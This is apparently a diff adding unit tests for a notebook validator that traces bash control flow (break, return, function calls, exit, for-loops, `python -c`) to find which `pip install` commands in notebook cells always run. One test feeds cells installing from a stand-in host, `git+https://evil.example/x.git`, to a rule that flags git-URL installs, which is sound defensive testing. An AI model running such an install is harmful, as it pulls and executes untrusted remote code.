@@ -4693,3 +4693,150 @@ def test_a_break_ends_the_loop_body_it_sits_in():
     assert ("!pip install a", False) in nv._split_chained(
         "!while true; do pip install a; break; done"
     )
+
+
+def test_a_break_stays_active_until_its_own_loop_closes():
+    """`while ...; do if ...; then break; fi; pip install x; done` never reaches the install.
+
+    Verified against bash. `break` leaves the innermost LOOP, so tracking the depth of the
+    compound it happens to sit in cleared the jump at the `fi` and replayed the rest anyway.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert nv._split_chained(
+        "!while true; do if true; then break; fi; pip install torchcodec==0.10; done"
+    ) == [("!true", False), ("!true", False), ("!break", False)]
+    # The line still continues after `done`, and a conditional break cuts nothing.
+    assert ("!pip install b", False) in nv._split_chained(
+        "!while true; do if true; then break; fi; pip install a; done; pip install b"
+    )
+    assert ("!pip install a", False) in nv._split_chained(
+        "!while true; do if maybe; then break; fi; pip install a; done"
+    )
+
+
+def test_a_return_ends_the_function_body_only():
+    """`f() { return; pip install x; }; f` installs nothing, but the CALLER carries on.
+
+    Verified against bash: `f() { return; echo AFTER; }; f; echo OUTER` prints only OUTER.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert nv._split_chained("!f() { return; pip install torchcodec==0.10; }; f") == [
+        ("!return", False),
+        ("!f", False),
+    ]
+    # Commands BEFORE the return still run, and so does the rest of the line.
+    assert nv._split_chained("!f() { pip install a; return; pip install b; }; f") == [
+        ("!pip install a", False),
+        ("!return", False),
+        ("!f", False),
+    ]
+
+
+def test_a_call_before_the_definition_reaches_nothing():
+    """Bash reports `f: command not found` for a call written above `f()`.
+
+    The replay matched on the name alone, so a body defined later was marked unconditional by
+    a call that never found it.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert nv._split_chained("!f || true; f() { pip install torchcodec==0.10; }") == [
+        ("!f", False),
+        ("!true", True),
+        ("!pip install torchcodec==0.10", True),
+    ]
+    # The ordinary order still resolves.
+    assert nv._split_chained("!f() { pip install a; }; f") == [
+        ("!pip install a", False),
+        ("!f", False),
+    ]
+
+
+def test_calling_a_function_that_ends_the_shell_ends_the_caller():
+    """`f() { exit; }; f; pip install x` never reaches the install.
+
+    Verified against bash. The terminator is conditional while `f` is only a definition, so
+    the hand-over has to be applied when the call is resolved, not where it was scanned.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert nv._split_chained("!f() { exit; }; f; pip install torchcodec==0.10") == [
+        ("!exit", False),
+        ("!f", False),
+    ]
+    assert nv._split_chained("!f() { exec true; }; f; pip install a") == [
+        ("!true", False),
+        ("!f", False),
+    ]
+    # Never called, or terminating only on a branch: the caller carries on.
+    for cell in ("!f() { exit; }; pip install a", "!f() { maybe && exit; }; f; pip install a"):
+        assert ("!pip install a", False) in nv._split_chained(cell), cell
+
+
+def test_a_call_carries_its_body_status_into_the_and_or_list():
+    """`f() { pip install x; }; f && pip install y` reaches the second install.
+
+    A call exits with its body's status, and recording only the name left the `&&` reading an
+    unknown left side, so the pair R-INST-004 compares never both appeared.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert [
+        (inv.action, inv.packages)
+        for inv in nv.unconditional_pip_invocations(
+            "!f() { pip install torch==2.11; }; f && pip install torchcodec==0.10"
+        )
+    ] == [("install", ["torch==2.11"]), ("install", ["torchcodec==0.10"])]
+    # A body that fails carries that too, and an unknown one stays unknown.
+    assert nv._split_chained("!f() { false; }; f || pip install a") == [
+        ("!false", False),
+        ("!f", False),
+        ("!pip install a", False),
+    ]
+    assert ("!pip install a", True) in nv._split_chained("!f() { maybe; }; f && pip install a")
+
+
+def test_a_literal_for_list_runs_its_body():
+    """`for x in a b; do ...; done` iterates, so the body is reached like a bare command.
+
+    An expansion or a glob may produce nothing, and turning either into a certainty would be
+    a guess, so only a literal list counts.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert [
+        (inv.action, inv.packages)
+        for inv in nv.unconditional_pip_invocations(
+            "!for pass in once; do pip install torch==2.11.0 torchcodec==0.10.0; done"
+        )
+    ] == [("install", ["torch==2.11.0", "torchcodec==0.10.0"])]
+    for cell in (
+        "!for x in $LIST; do pip install a; done",
+        "!for x in *.txt; do pip install a; done",
+    ):
+        assert list(nv.unconditional_pip_invocations(cell)) == [], cell
+
+
+def test_python_dash_c_terminates_the_option_list():
+    """`python -cpass -m pip ...` runs `pass`; the rest are script arguments.
+
+    Verified locally: the command produces no pip output. `python --help` documents `-c cmd`
+    as "program passed in as string (terminates option list)".
+    """
+    nv = _load_notebook_validator_module()
+
+    for cell in (
+        "!python -cpass -m pip install git+https://evil.example/x.git",
+        "!python -c pass -m pip install git+https://evil.example/x.git",
+    ):
+        assert nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0) == [], cell
+    # The ordinary forms still run pip.
+    for cell in (
+        "!python -m pip install git+https://evil.example/x.git",
+        "!python -W ignore -m pip install git+https://evil.example/x.git",
+    ):
+        assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
+            "R-INST-001"
+        ], cell
